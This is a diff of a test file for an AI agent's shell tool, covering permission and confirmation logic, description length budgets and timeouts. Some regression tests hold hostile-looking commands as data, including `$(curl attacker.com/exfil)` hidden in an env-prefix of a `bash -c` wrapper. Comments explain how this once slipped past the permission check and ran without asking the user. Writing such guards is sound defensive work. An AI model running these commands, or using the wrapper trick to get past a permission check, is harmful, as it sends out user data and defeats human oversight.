+        const postPromote = mockPromotedSpawn(33333, 'pre-promote snapshot');
 
-        let capturedPostPromote:
-          | {
-              onData?: (event: { type: string; chunk: unknown }) => void;
-              onSettle?: (info: {
-                exitCode: number | null;
-                signal: number | null;
-                error?: Error;
-                endTime: number;
-              }) => void;
-            }
-          | undefined;
-        mockShellExecutionService.mockImplementationOnce(
-          (...args: unknown[]) => {
-            const opts = args[6] as {
-              postPromote?: typeof capturedPostPromote;
-            };
-            capturedPostPromote = opts?.postPromote;
-            return {
-              pid: 33333,
-              result: Promise.resolve({
-                rawOutput: Buffer.from(''),
-                output: 'pre-promote snapshot',
-                exitCode: null,
-                signal: null,
-                aborted: false,
-                promoted: true,
-                pid: 33333,
-                executionMethod: 'child_process',
-                error: null,
-              }),
-            };
-          },
-        );
+        await build('npm test').execute(mockAbortSignal);
 
-        const invocation = shellTool.build({
-          command: 'npm test',
-          is_background: false,
-        });
-        await invocation.execute(mockAbortSignal);
-
-        // Drive a post-promote chunk with embedded ANSI escapes —
-        // common shapes: color, cursor move, clear-screen.
+        // Common escapes: color, cursor move, clear-screen.
         const ansiChunk =
           '\x1b[31mFAILED\x1b[0m: 3 tests\n\x1b[2K\x1b[1Aprogress: 50%';
-        capturedPostPromote?.onData?.({ type: 'data', chunk: ansiChunk });
+        postPromote()?.onData?.({ type: 'data', chunk: ansiChunk });
 
-        // The stream should have received the STRIPPED version: the
-        // visible text without escape sequences.
+        // The stream received the visible text without escape sequences.
         const writeCalls = writeStreamMock.write.mock.calls.map(
           (c: unknown[]) => c[0] as string,
         );
@@ -8562,83 +4680,107 @@ describe('ShellTool', () => {
   });
 
   describe('getDefaultPermission and getConfirmationDetails', () => {
-    it('should not request confirmation for read-only commands', async () => {
-      const invocation = shellTool.build({
-        command: 'ls -la',
-        is_background: false,
-      });
+    const detailsOf = async (
+      invocation: ToolInvocation<ShellToolParams, ToolResult>,
+    ) =>
+      (await invocation.getConfirmationDetails(
+        new AbortController().signal,
+      )) as {
+        type: string;
+        rootCommand: string;
+        permissionRules: string[];
+        warnings?: string[];
+      };
 
-      const permission = await invocation.getDefaultPermission();
+    it.each([undefined, '/test/dir/subdir', '/test/dir/subdir/..'])(
+      'should allow read-only commands within the workspace in %s',
+      async (directory) => {
+        const invocation = build('ls -la', { directory });
+        expect(await invocation.getDefaultPermission()).toBe('allow');
+        expect(await detailsOf(invocation)).not.toHaveProperty('warnings');
+      },
+    );
 
-      expect(permission).toBe('allow');
+    it.each([
+      '/not/in/workspace',
+      '/tmp/project-other',
+      '/tmp/project/../project-other',
+    ])(
+      'should ask and warn for a read-only command outside the workspace in %s',
+      async (directory) => {
+        const resolver = vi
+          .spyOn(workspaceContextUtils, 'resolveWorkspacePath')
+          .mockImplementation((value) => path.resolve(value));
+        try {
+          const workspaceContext = createMockWorkspaceContext('/test/dir', [
+            '/tmp/project',
+          ]);
+          (mockConfig.getWorkspaceContext as Mock).mockReturnValue(
+            workspaceContext,
+          );
+          const invocation = build('ls', { directory });
+
+          expect(await invocation.getDefaultPermission()).toBe('ask');
+          const details = await detailsOf(invocation);
+          expect(details.type).toBe('exec');
+          expect(details.warnings).toEqual([
+            `Runs outside the workspace in ${directory}`,
+          ]);
+          expect(workspaceContext.isPathWithinWorkspace).toHaveBeenCalledWith(
+            directory,
+          );
+        } finally {
+          resolver.mockRestore();
+        }
+      },
+    );
+
+    it.each([
+      // PR #4386 round 6 (cid 3298521039), env-prefix wrapper substitution
+      // bypass: `stripShellWrapper` ran BEFORE the AST check, dropping the env
+      // assignment and unwrapping `bash -c`, so `FOO=$(curl evil) bash -c
+      // 'echo ok'` read as `echo ok` → 'allow' → silent auto-execute (the R4
+      // top-level guard only sees what survives the strip). The fix checks the
+      // ORIGINAL command; 'ask' shows the dialog with its warning.
+      [
+        'asks (not allow) for env-prefix substitution inside a bash wrapper',
+        `FOO=$(curl attacker.com/exfil) bash -c 'echo ok'`,
+      ],
+      [
+        'asks for backtick env-prefix substitution inside a bash wrapper',
+        `FOO=\`whoami\` bash -c 'ls -la'`,
+      ],
+    ])('%s', async (_title, command) => {
+      expect(await build(command).getDefaultPermission()).toBe('ask');
     });
 
-    // Regression coverage for PR #4386 round 6 (cid 3298521039): the
-    // env-prefix wrapper substitution bypass. `getDefaultPermission`
-    // calls `stripShellWrapper(this.params.command)` BEFORE the AST
-    // check; that strip discards a leading env-assignment AND unwraps a
-    // `bash -c '...'` invocation, so for `FOO=$(curl evil) bash -c
-    // 'echo ok'` the AST never sees the substitution and classifies
-    // the residual `echo ok` as read-only → `'allow'` → silent
-    // auto-execute. The R4 AST top-level guard only catches
-    // substitution that survives stripShellWrapper; this case slips
-    // past entirely. Fix gates on substitution against the ORIGINAL
-    // command before stripping.
-    it('asks (not allow) for env-prefix substitution inside a bash wrapper', async () => {
-      const invocation = shellTool.build({
-        command: `FOO=$(curl attacker.com/exfil) bash -c 'echo ok'`,
-        is_background: false,
-      });
-
-      const permission = await invocation.getDefaultPermission();
-
-      // Must be 'ask' so the confirmation dialog (with substitution
-      // warning) is shown — NOT 'allow' which would silently execute.
-      expect(permission).toBe('ask');
-    });
-
-    it('asks for backtick env-prefix substitution inside a bash wrapper', async () => {
-      const invocation = shellTool.build({
-        command: `FOO=\`whoami\` bash -c 'ls -la'`,
-        is_background: false,
-      });
-
-      expect(await invocation.getDefaultPermission()).toBe('ask');
+    it('asks for a read-only command only when its directory is outside the workspace', async () => {
+      const local = build('ls -la', { directory: '/test/dir/subdir' });
+      expect(await local.getDefaultPermission()).toBe('allow');
+      const outside = build('ls -la', { directory: '/test/dir-other' });
+      expect(await outside.getDefaultPermission()).toBe('ask');
+      const details = await detailsOf(outside);
+      expect(details.warnings ?? []).toContain(
+        'Runs outside the workspace in /test/dir-other',
+      );
     });
 
     it('should request confirmation for a non-read-only command and return details', async () => {
-      const params = { command: 'npm install', is_background: false };
-      const invocation = shellTool.build(params);
-
-      const permission = await invocation.getDefaultPermission();
-      expect(permission).toBe('ask');
-
-      const details = await invocation.getConfirmationDetails(
-        new AbortController().signal,
-      );
-      expect(details.type).toBe('exec');
+      const invocation = build('npm install');
+      expect(await invocation.getDefaultPermission()).toBe('ask');
+      expect((await detailsOf(invocation)).type).toBe('exec');
     });
 
     it('should exclude read-only sub-commands from confirmation details in compound commands', async () => {
       // "cd" is read-only, "npm run build" is not
-      const params = {
-        command: 'cd packages/core && npm run build',
-        is_background: false,
-      };
-      const invocation = shellTool.build(params);
+      const invocation = build('cd packages/core && npm run build');
+      expect(await invocation.getDefaultPermission()).toBe('ask');
 
-      const permission = await invocation.getDefaultPermission();
-      expect(permission).toBe('ask');
+      const details = await detailsOf(invocation);
 
-      const details = (await invocation.getConfirmationDetails(
-        new AbortController().signal,
-      )) as { rootCommand: string; permissionRules: string[] };
-
-      // rootCommand should only include 'npm', not 'cd'
+      // Neither rootCommand nor permissionRules include cd.
       expect(details.rootCommand).not.toContain('cd');
       expect(details.rootCommand).toContain('npm');
-
-      // permissionRules should not include Bash(cd *)
       expect(details.permissionRules).not.toContainEqual(
         expect.stringContaining('cd'),
       );
@@ -8648,18 +4790,10 @@ describe('ShellTool', () => {
     });
 
     it('should not surface file descriptor redirects as standalone commands in confirmation details', async () => {
-      const params = {
-        command: 'npm run build 2>&1 | head -100',
-        is_background: false,
-      };
-      const invocation = shellTool.build(params);
+      const invocation = build('npm run build 2>&1 | head -100');
+      expect(await invocation.getDefaultPermission()).toBe('ask');
 
-      const permission = await invocation.getDefaultPermission();
-      expect(permission).toBe('ask');
-
-      const details = (await invocation.getConfirmationDetails(
-        new AbortController().signal,
-      )) as { rootCommand: string; permissionRules: string[] };
+      const details = await detailsOf(invocation);
 
       expect(details.rootCommand).toBe('npm');
       expect(details.permissionRules).toEqual(['Bash(npm run *)']);
@@ -8676,14 +4810,9 @@ describe('ShellTool', () => {
       pm.initialize();
       (mockConfig.getPermissionManager as Mock).mockReturnValue(pm);
 
-      const invocation = shellTool.build({
-        command: 'git add /tmp/file && git commit -m "msg"',
-        is_background: false,
-      });
-
-      const details = (await invocation.getConfirmationDetails(
-        new AbortController().signal,
-      )) as { rootCommand: string; permissionRules: string[] };
+      const details = await detailsOf(
+        build('git add /tmp/file && git commit -m "msg"'),
+      );
 
       expect(details.rootCommand).toBe('git');
       expect(details.permissionRules).toEqual(['Bash(git commit *)']);
@@ -8695,13 +4824,9 @@ describe('ShellTool', () => {
       } as unknown as PermissionManager;
       (mockConfig.getPermissionManager as Mock).mockReturnValue(pm);
 
-      const invocation = shellTool.build({
-        command: 'git commit -m "msg"',
-        directory: '/test/dir/subdir',
-        is_background: false,
-      });
-
-      await invocation.getConfirmationDetails(new AbortController().signal);
+      await detailsOf(
+        build('git commit -m "msg"', { directory: '/test/dir/subdir' }),
+      );
 
       expect(pm.isCommandAllowed).toHaveBeenCalledWith(
         'git commit -m "msg"',
@@ -8710,96 +4835,63 @@ describe('ShellTool', () => {
     });
 
     it('should throw an error if validation fails', async () => {
-      expect(() =>
-        shellTool.build({ command: '', is_background: false }),
-      ).toThrow();
+      expect(() => build('')).toThrow();
     });
 
-    // Regression coverage for issue #4093: command substitution must be
-    // visibly flagged in the confirmation prompt rather than silently
-    // denied. See ShellToolInvocation.getConfirmationDetails for context.
+    // Issue #4093: command substitution must be visibly flagged in the
+    // confirmation prompt rather than silently denied (see
+    // ShellToolInvocation.getConfirmationDetails).
     describe('command substitution warning (issue #4093)', () => {
+      /** The warnings for `command`, asserting the first flags substitution. */
+      const expectSubstitutionWarning = async (command: string) => {
+        const { warnings } = await detailsOf(build(command));
+        expect(warnings?.[0]).toMatch(/command substitution/i);
+        return warnings;
+      };
+
       it('surfaces a warning for $() command substitution', async () => {
-        const invocation = shellTool.build({
-          command: 'python3 -c "print($(echo hello))"',
-          is_background: false,
-        });
-        const details = (await invocation.getConfirmationDetails(
-          new AbortController().signal,
-        )) as { warnings?: string[] };
+        const warnings = await expectSubstitutionWarning(
+          'python3 -c "print($(echo hello))"',
+        );
 
-        expect(details.warnings).toBeDefined();
-        expect(details.warnings).toHaveLength(1);
-        expect(details.warnings?.[0]).toMatch(/command substitution/i);
+        expect(warnings).toBeDefined();
+        expect(warnings).toHaveLength(1);
       });
 
-      it('surfaces a warning for backtick command substitution', async () => {
-        const invocation = shellTool.build({
-          command: 'echo `whoami`',
-          is_background: false,
-        });
-        const details = (await invocation.getConfirmationDetails(
-          new AbortController().signal,
-        )) as { warnings?: string[] };
-
-        expect(details.warnings?.[0]).toMatch(/command substitution/i);
-      });
-
-      it('surfaces a warning for <() process substitution', async () => {
-        const invocation = shellTool.build({
-          command: 'diff <(ls /a) <(ls /b)',
-          is_background: false,
-        });
-        const details = (await invocation.getConfirmationDetails(
-          new AbortController().signal,
-        )) as { warnings?: string[] };
-
-        expect(details.warnings?.[0]).toMatch(/command substitution/i);
-      });
-
-      it('surfaces a warning for >() output process substitution', async () => {
-        const invocation = shellTool.build({
-          command: 'echo data > >(tee log.txt)',
-          is_background: false,
-        });
-        const details = (await invocation.getConfirmationDetails(
-          new AbortController().signal,
-        )) as { warnings?: string[] };
-
-        expect(details.warnings?.[0]).toMatch(/command substitution/i);
+      it.each([
+        [
+          'surfaces a warning for backtick command substitution',
+          'echo `whoami`',
+        ],
+        [
+          'surfaces a warning for <() process substitution',
+          'diff <(ls /a) <(ls /b)',
+        ],
+        [
+          'surfaces a warning for >() output process substitution',
+          'echo data > >(tee log.txt)',
+        ],
+      ])('%s', async (_title, command) => {
+        await expectSubstitutionWarning(command);
       });
 
       it('does not set warnings on commands without substitution', async () => {
-        const invocation = shellTool.build({
-          command: 'npm install',
-          is_background: false,
-        });
-        const details = (await invocation.getConfirmationDetails(
-          new AbortController().signal,
-        )) as { warnings?: string[] };
+        const details = await detailsOf(build('npm install'));
 
         // `warnings` should be omitted entirely when there's nothing to flag.
         expect(details.warnings).toBeUndefined();
       });
 
-      // Regression coverage for PR #4386 R4 (cid 3293075622): the
-      // `|| detectCommandSubstitution(rawCommand)` branch of
-      // `buildShellExecWarnings` only fires for shapes where
-      // `stripShellWrapper` yields a substitution-free inner command
-      // (here `echo ok`) but the raw command has substitution in the
-      // env-prefix. Without this case, removing the `||` clause would
-      // not regress any test in this describe block.
+      // PR #4386 R4 (cid 3293075622): `buildShellExecWarnings`'s
+      // `|| detectCommandSubstitution(rawCommand)` branch only fires when the
+      // stripped inner command (`echo ok`) is clean but the env-prefix is not;
+      // without this case, removing the `||` clause regresses nothing.
       it('surfaces a warning for substitution in the env-prefix of a shell wrapper', async () => {
-        const invocation = shellTool.build({
-          command: `FOO=$(cat secret.txt) bash -c 'echo ok'`,
-          is_background: false,
-        });
-        const details = (await invocation.getConfirmationDetails(
-          new AbortController().signal,
-        )) as { warnings?: string[] };
+        const warnings = await expectSubstitutionWarning(
+          `FOO=$(cat secret.txt) bash -c 'echo ok'`,
+        );
 
-        expect(details.warnings).toBeDefined();
-        expect(details.warnings?.[0]).toMatch(/command substitution/i);
+        expect(warnings).toBeDefined();
       });
     });
   });
@@ -8811,23 +4903,60 @@ describe('ShellTool', () => {
       process.env = { ...originalEnv };
     });
 
-    it('should return the windows description when on windows', async () => {
-      vi.mocked(os.platform).mockReturnValue('win32');
+    function buildForShape(
+      platform: 'linux' | 'win32',
+      comSpec?: string,
+      msystem?: string,
+    ): ShellTool {
+      vi.mocked(os.platform).mockReturnValue(platform);
       delete process.env['ComSpec'];
       delete process.env['MSYSTEM'];
       delete process.env['TERM'];
-      const shellTool = new ShellTool(mockConfig);
+      if (comSpec) process.env['ComSpec'] = comSpec;
+      if (msystem) process.env['MSYSTEM'] = msystem;
+      return new ShellTool(mockConfig);
+    }
+
+    const CMD = 'C:\\WINDOWS\\System32\\cmd.exe';
+    const WIN_PS =
+      'C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
+    const PWSH = 'C:\\Program Files\\PowerShell\\7\\pwsh.exe';
+
+    it('should return the windows description when on windows', async () => {
+      const shellTool = buildForShape('win32');
       expect(shellTool.description).toMatchSnapshot();
-      expect(shellTool.description).toContain(
+      expectText(shellTool.description, [
         "Use '&' only when you need to run commands sequentially",
-      );
-      expect(shellTool.description).toContain(
         "DO NOT use ';' or newlines to separate commands in cmd.exe.",
-      );
+      ]);
       expect(getCommandParameterDescription(shellTool)).toBe(
         'Exact cmd.exe command to execute as `cmd.exe /d /s /c <command>`',
       );
     });
+
+    it.each(['cmd.exe', 'powershell.exe'])(
+      'advertises Bash for SSH when the local shell is %s',
+      async (localShell) => {
+        const local = buildForShape('win32', localShell);
+        expect(getCommandParameterDescription(local)).not.toContain('bash -c');
+        const remote = new SshExecutionEnvironment(
+          { host: 'test-host', directory: '/remote' },
+          'C:\\ssh-anchor',
+        );
+        onTestFinished(() => remote.dispose());
+        mockConfig.getExecutionEnvironment = vi.fn().mockReturnValue(remote);
+        const tool = new ShellTool(mockConfig);
+        expectText(
+          tool.description,
+          ['The active shell is Bash.'],
+          ['The active shell is PowerShell.', 'cmd.exe'],
+        );
+        expect(tool.schema.description).toContain('`bash -c <command>`');
+        expect(getCommandParameterDescription(tool)).toBe(
+          'Exact bash command to execute as `bash -c <command>`',
+        );
+      },
+    );
 
     it('should return the non-windows description when not on windows', async () => {
       vi.mocked(os.platform).mockReturnValue('linux');
@@ -8839,28 +4968,17 @@ describe('ShellTool', () => {
     });
 
     it('should describe PowerShell when ComSpec points to powershell.exe', async () => {
-      vi.mocked(os.platform).mockReturnValue('win32');
-      process.env['ComSpec'] =
-        'C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
-      delete process.env['MSYSTEM'];
-      delete process.env['TERM'];
+      const shellTool = buildForShape('win32', WIN_PS);
 
-      const shellTool = new ShellTool(mockConfig);
-
-      expect(shellTool.description).toContain(
-        '`powershell.exe -NoProfile -Command <command>`',
-      );
-      expect(shellTool.description).toContain(
-        'The active shell is PowerShell.',
-      );
-      expect(shellTool.description).toContain(
-        'Do NOT use Bash-only forms such as ANSI-C quoting',
-      );
-      expect(shellTool.description).toContain(
-        "Windows PowerShell does not support '&&'.",
-      );
-      expect(shellTool.description).not.toContain(
-        "use a single run_shell_command call with '&&'",
+      expectText(
+        shellTool.description,
+        [
+          '`powershell.exe -NoProfile -Command <command>`',
+          'The active shell is PowerShell.',
+          'Do NOT use Bash-only forms such as ANSI-C quoting',
+          "Windows PowerShell does not support '&&'.",
+        ],
+        ["use a single run_shell_command call with '&&'"],
       );
       expect(getCommandParameterDescription(shellTool)).toBe(
         'Exact PowerShell command to execute as `powershell.exe -NoProfile -Command <command>`',
@@ -8868,123 +4986,157 @@ describe('ShellTool', () => {
     });
 
     it('should describe pwsh when ComSpec points to pwsh.exe', async () => {
-      vi.mocked(os.platform).mockReturnValue('win32');
-      process.env['ComSpec'] = 'C:\\Program Files\\PowerShell\\7\\pwsh.exe';
-      delete process.env['MSYSTEM'];
-      delete process.env['TERM'];
+      const shellTool = buildForShape('win32', PWSH);
 
-      const shellTool = new ShellTool(mockConfig);
-
-      expect(shellTool.description).toContain(
+      expectText(shellTool.description, [
         '`pwsh.exe -NoProfile -Command <command>`',
-      );
-      expect(shellTool.description).toContain(
         "use a single run_shell_command call with '&&'",
-      );
+      ]);
       expect(getCommandParameterDescription(shellTool)).toBe(
         'Exact PowerShell command to execute as `pwsh.exe -NoProfile -Command <command>`',
       );
     });
 
     it('should describe bash when Windows is running in Git Bash', async () => {
-      vi.mocked(os.platform).mockReturnValue('win32');
-      process.env['ComSpec'] = 'C:\\WINDOWS\\System32\\cmd.exe';
-      process.env['MSYSTEM'] = 'MINGW64';
-      delete process.env['TERM'];
+      const shellTool = buildForShape('win32', CMD, 'MINGW64');
 
-      const shellTool = new ShellTool(mockConfig);
-
-      expect(shellTool.description).toContain('`bash -c <command>`');
-      expect(shellTool.description).toContain('The active shell is Bash.');
-      expect(shellTool.description).toContain('ANSI-C quoting');
-      expect(shellTool.description).not.toContain(
-        'Command process group can be terminated',
+      expectText(
+        shellTool.description,
+        ['`bash -c <command>`', 'The active shell is Bash.', 'ANSI-C quoting'],
+        ['Command process group can be terminated'],
       );
       expect(getCommandParameterDescription(shellTool)).toBe(
         'Exact bash command to execute as `bash -c <command>`',
       );
     });
+
+    /**
+     * Per-turn size budgets, as for Workflow and Agent (`workflow.test.ts`,
+     * `agent-description-budget.test.ts`, #12054); this is the second-largest
+     * resident description. Snapshots pin what it says, not how much
+     * (`vitest -u` accepts any growth), and every character goes out on every
+     * request. Budgets also keep shells comparable: cmd and PowerShell are
+     * cheaper than bash, and levelling them up should be deliberate.
+     * Measured: bash/linux 4,946 · Git Bash 4,771 · powershell.exe 4,456 ·
+     * pwsh.exe 4,350 · cmd.exe 4,207; each budget adds ~350 (a sentence), so
+     * a paragraph added to the shared prompt reddens all five rows.
+     */
+    const SHAPES: Array<
+      [
+        string,
+        'linux' | 'win32',
+        string | undefined,
+        string | undefined,
+        number,
+      ]
+    > = [
+      ['bash on linux', 'linux', undefined, undefined, 4_670],
+      ['Git Bash on win32', 'win32', CMD, 'MINGW64', 4_490],
+      ['powershell.exe', 'win32', WIN_PS, undefined, 4_390],
+      ['pwsh.exe', 'win32', PWSH, undefined, 4_290],
+      ['cmd.exe', 'win32', CMD, undefined, 4_150],
+    ];
+
+    it.each(SHAPES)(
+      'keeps the %s description within its per-turn budget',
+      (_name, platform, comSpec, msystem, budget) => {
+        expect(
+          buildForShape(platform, comSpec, msystem).description.length,
+        ).toBeLessThanOrEqual(budget);
+      },
+    );
+
+    // The other half of a budget: what may not be traded to meet one. #12054
+    // lists these quoting, dedicated-tool and execution-boundary rules as
+    // verbose-reading but load-bearing.
+    it.each(SHAPES)(
+      'keeps the call-boundary rules in the %s description',
+      (_name, platform, comSpec, msystem) => {
+        const { description } = buildForShape(platform, comSpec, msystem);
+        for (const clause of [
+          'DO NOT use it for file operations',
+          'Content search: Use grep_search',
+          'Read files: Use read_file',
+          'up to 600000ms',
+          'Shell argument quoting and special characters',
+          'When issuing multiple commands',
+          'use `task_stop` when a task id is available',
+          'pkill node',
+          'avoiding usage of `cd`',
+        ]) {
+          expect(description).toContain(clause);
+        }
+      },
+    );
+
+    // Other parameter descriptions don't vary by shell, so one shape suffices;
+    // `command` does vary and is pinned exactly per shape above.
+    it.each<[string, number]>([
+      ['is_background', 350],
+      ['directory', 250],
+      ['description', 220],
+      ['timeout', 100],
+    ])(
+      'keeps the %s parameter description within its budget',
+      (name, budget) => {
+        const schema = buildForShape('linux').schema.parametersJsonSchema as {
+          properties: Record<string, { description?: string }>;
+        };
+        // No `?? 0` fallback: renaming one of these parameters must fail the
+        // row rather than pass it on a length of zero.
+        const description = schema.properties[name]?.description;
+        if (description === undefined) {
+          throw new Error(`shell schema has no budgeted parameter "${name}"`);
+        }
+        expect(description.length).toBeLessThanOrEqual(budget);
+      },
+    );
   });
 
   describe('timeout parameter', () => {
+    const TIMED_OUT =
+      'Command timed out after 5000ms before it could complete.';
+
+    /** Runs a 5s-timeout foreground command under `signal`, then settles it with `result`. */
+    const runTimed = (
+      result: Partial<ShellExecutionResult>,
+      { signal = new AbortController().signal, beforeSettle = () => {} } = {},
+    ) => {
+      const promise = build('long-running-command', { timeout: 5000 }).execute(
+        signal,
+      );
+      beforeSettle();
+      resolveExecutionPromise(
+        shellResult({ exitCode: null, aborted: true, ...result }),
+      );
+      return promise;
+    };
+
     it('should validate timeout parameter correctly', async () => {
-      // Valid timeout
-      expect(() => {
-        shellTool.build({
-          command: 'echo test',
-          is_background: false,
-          timeout: 5000,
-        });
-      }).not.toThrow();
-
-      // Valid small timeout
-      expect(() => {
-        shellTool.build({
-          command: 'echo test',
-          is_background: false,
-          timeout: 500,
-        });
-      }).not.toThrow();
-
-      // Zero timeout
-      expect(() => {
-        shellTool.build({
-          command: 'echo test',
-          is_background: false,
-          timeout: 0,
-        });
-      }).toThrow('params/timeout must be >= 1');
-
-      // Negative timeout
-      expect(() => {
-        shellTool.build({
-          command: 'echo test',
-          is_background: false,
-          timeout: -1000,
-        });
-      }).toThrow('params/timeout must be >= 1');
-
-      // Timeout too large
-      expect(() => {
-        shellTool.build({
-          command: 'echo test',
-          is_background: false,
-          timeout: 700000,
-        });
-      }).toThrow('params/timeout must be <= 600000');
-
-      // Non-integer timeout
-      expect(() => {
-        shellTool.build({
-          command: 'echo test',
-          is_background: false,
-          timeout: 5000.5,
-        });
-      }).toThrow('params/timeout must be integer');
-
-      // Non-number timeout (schema validation catches this first)
-      expect(() => {
-        shellTool.build({
-          command: 'echo test',
-          is_background: false,
-          timeout: 'invalid' as unknown as number,
-        });
-      }).toThrow('params/timeout must be integer');
+      for (const [timeout, error] of [
+        [5000, null], // Valid timeout
+        [500, null], // Valid small timeout
+        [0, 'params/timeout must be >= 1'], // Zero timeout
+        [-1000, 'params/timeout must be >= 1'], // Negative timeout
+        [700000, 'params/timeout must be <= 600000'], // Timeout too large
+        [5000.5, 'params/timeout must be integer'], // Non-integer timeout
+        // Non-number timeout (schema validation catches this first)
+        ['invalid' as unknown as number, 'params/timeout must be integer'],
+      ] as Array<[number, string | null]>) {
+        const act = () => build('echo test', { timeout });
+        if (error === null) expect(act).not.toThrow();
+        else expect(act).toThrow(error);
+      }
     });
 
     it('should include timeout in description for foreground commands', async () => {
-      const invocation = shellTool.build({
-        command: 'npm test',
-        is_background: false,
-        timeout: 30000,
-      });
+      const invocation = build('npm test', { timeout: 30000 });
 
       expect(invocation.getDescription()).toBe('npm test [timeout: 30000ms]');
     });
 
     it('should not include timeout in description for background commands', async () => {
-      const invocation = shellTool.build({
-        command: 'npm start',
+      const invocation = build('npm start', {
         is_background: true,
         timeout: 30000,
       });
@@ -8994,38 +5146,14 @@ describe('ShellTool', () => {
 
     it('should create combined signal with timeout for foreground execution', async () => {
       const mockAbortSignal = new AbortController().signal;
-      const invocation = shellTool.build({
-        command: 'sleep 1',
-        is_background: false,
-        timeout: 5000,
-      });
-
-      const promise = invocation.execute(mockAbortSignal);
-
-      resolveExecutionPromise({
-        rawOutput: Buffer.from(''),
-        output: '',
-        exitCode: 0,
-        signal: null,
-        error: null,
-        aborted: false,
-        pid: 12345,
-        executionMethod: 'child_process',
-      });
-
+      const promise = build('sleep 1', { timeout: 5000 }).execute(
+        mockAbortSignal,
+      );
+      resolveExecutionPromise(shellResult());
       await promise;
 
       // Verify that ShellExecutionService was called with a combined signal
-      expect(mockShellExecutionService).toHaveBeenCalledWith(
-        expect.any(String),
-        expect.any(String),
-        expect.any(Function),
-        expect.any(AbortSignal),
-        false,
-        expect.objectContaining({}),
-
-        expect.objectContaining({ postPromote: expect.any(Object) }),
-      );
+      expectSpawned(expect.any(String));
 
       // The signal passed should be different from the original signal
       const calledSignal = mockShellExecutionService.mock.calls[0][3];
@@ -9034,241 +5162,94 @@ describe('ShellTool', () => {
 
     it('keeps the first timeout after a later user cancellation', async () => {
       const userAbortController = new AbortController();
-      const invocation = shellTool.build({
-        command: 'long-running-command',
-        is_background: false,
-        timeout: 5000,
-      });
+      stubAbortSignal(fakeSignal(false), timedOutSignal());
 
-      // Mock AbortSignal.timeout and AbortSignal.any
-      const mockTimeoutSignal = {
-        aborted: false,
-        addEventListener: vi.fn(),
-        removeEventListener: vi.fn(),
-      } as unknown as AbortSignal;
+      const result = await runTimed(
+        { output: 'partial output' },
+        {
+          signal: userAbortController.signal,
+          beforeSettle: () => userAbortController.abort(),
+        },
+      );
 
-      const mockCombinedSignal = {
-        aborted: true,
-        reason: new DOMException('timed out', 'TimeoutError'),
-        addEventListener: vi.fn(),
-        removeEventListener: vi.fn(),
-      } as unknown as AbortSignal;
-
-      const originalAbortSignal = globalThis.AbortSignal;
-      vi.stubGlobal('AbortSignal', {
-        ...originalAbortSignal,
-        timeout: vi.fn().mockReturnValue(mockTimeoutSignal),
-        any: vi.fn().mockReturnValue(mockCombinedSignal),
-      });
-
-      const promise = invocation.execute(userAbortController.signal);
-      userAbortController.abort();
-
-      resolveExecutionPromise({
-        rawOutput: Buffer.from('partial output'),
-        output: 'partial output',
-        exitCode: null,
-        signal: null,
-        error: null,
-        aborted: true,
-        pid: 12345,
-        executionMethod: 'child_process',
-      });
-
-      let result;
-      try {
-        result = await promise;
-      } finally {
-        vi.stubGlobal('AbortSignal', originalAbortSignal);
-      }
-
-      expect(result.llmContent).toContain('Command timed out after 5000ms');
-      expect(result.llmContent).toContain(
+      expectText(result.llmContent, [
+        'Command timed out after 5000ms',
         'Below is the output before it timed out',
-      );
-      expect(result.returnDisplay).toContain(
-        'Command timed out after 5000ms before it could complete.',
-      );
-      expect(result.returnDisplay).toContain('partial output');
+      ]);
+      expect(shellResultText(result.returnDisplay)).toContain(TIMED_OUT);
+      expect(result.returnDisplay).toMatchObject({
+        type: 'shell_result',
+        output: 'partial output',
+        outcome: 'timed_out',
+        error: expect.stringContaining('timed out'),
+      });
+      expect(shellResultText(result.returnDisplay)).toContain('partial output');
       expect(result.error).toEqual({
-        message: 'Command timed out after 5000ms before it could complete.',
+        message: TIMED_OUT,
         type: ToolErrorType.EXECUTION_TIMEOUT,
       });
     });
 
     it('returns a structured timeout when the command produced no output', async () => {
-      const invocation = shellTool.build({
-        command: 'long-running-command',
-        is_background: false,
-        timeout: 5000,
-      });
-      const mockCombinedSignal = {
-        aborted: true,
-        reason: new DOMException('timed out', 'TimeoutError'),
-        addEventListener: vi.fn(),
-        removeEventListener: vi.fn(),
-      } as unknown as AbortSignal;
-      const originalAbortSignal = globalThis.AbortSignal;
-      vi.stubGlobal('AbortSignal', {
-        ...originalAbortSignal,
-        timeout: vi.fn().mockReturnValue(mockCombinedSignal),
-        any: vi.fn().mockReturnValue(mockCombinedSignal),
-      });
+      stubAbortSignal(timedOutSignal());
 
-      try {
-        const promise = invocation.execute(new AbortController().signal);
-        resolveExecutionPromise({
-          rawOutput: Buffer.alloc(0),
-          output: '',
-          exitCode: null,
-          signal: null,
-          error: null,
-          aborted: true,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        const result = await promise;
+      const result = await runTimed({});
 
-        expect(result.llmContent).toContain(
-          'There was no output before it timed out.',
-        );
-        expect(result.returnDisplay).toContain(
-          'There was no output before it timed out.',
-        );
-        expect(result.error?.type).toBe(ToolErrorType.EXECUTION_TIMEOUT);
-      } finally {
-        vi.stubGlobal('AbortSignal', originalAbortSignal);
-      }
+      expect(result.llmContent).toContain(
+        'There was no output before it timed out.',
+      );
+      expect(shellResultText(result.returnDisplay)).toContain(
+        'There was no output before it timed out.',
+      );
+      expect(result.error?.type).toBe(ToolErrorType.EXECUTION_TIMEOUT);
     });
 
     it('keeps truncated timeout detail out of the operational error summary', async () => {
-      const truncationModule = await import('./truncation.js');
-      const truncationSpy = vi
-        .spyOn(truncationModule, 'truncateToolOutput')
-        .mockResolvedValue({
-          content:
-            'Tool output was too large and has been truncated.\n' +
-            'Full output saved to: /tmp/tool-output.txt',
-          outputFile: '/tmp/tool-output.txt',
-        });
-      const invocation = shellTool.build({
-        command: 'long-running-command',
-        is_background: false,
-        timeout: 5000,
+      await spyTruncation({
+        content:
+          'Tool output was too large and has been truncated.\n' +
+          'Full output saved to: /tmp/tool-output.txt',
+        outputFile: '/tmp/tool-output.txt',
       });
-      const mockCombinedSignal = {
-        aborted: true,
-        reason: new DOMException('timed out', 'TimeoutError'),
-        addEventListener: vi.fn(),
-        removeEventListener: vi.fn(),
-      } as unknown as AbortSignal;
-      const originalAbortSignal = globalThis.AbortSignal;
-      vi.stubGlobal('AbortSignal', {
-        ...originalAbortSignal,
-        timeout: vi.fn().mockReturnValue(mockCombinedSignal),
-        any: vi.fn().mockReturnValue(mockCombinedSignal),
+      stubAbortSignal(timedOutSignal());
+
